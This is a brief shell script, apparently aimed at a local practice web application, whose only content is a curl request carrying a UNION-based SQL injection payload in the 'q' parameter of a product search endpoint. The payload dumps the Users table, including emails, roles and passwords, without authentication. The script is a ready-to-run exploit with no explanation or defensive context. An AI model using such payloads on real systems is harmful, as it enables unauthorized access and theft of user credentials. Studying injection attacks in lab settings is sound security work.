#!/bin/sh
# UNION-based SQLi -> full Users table dump (unauthenticated)
curl -s -G --data-urlencode "q=apple')) UNION ALL SELECT id,email,role,password,deletedAt,1,1,1,1,1 FROM Users --" \
     'http://host.docker.internal:3000/rest/products/search'
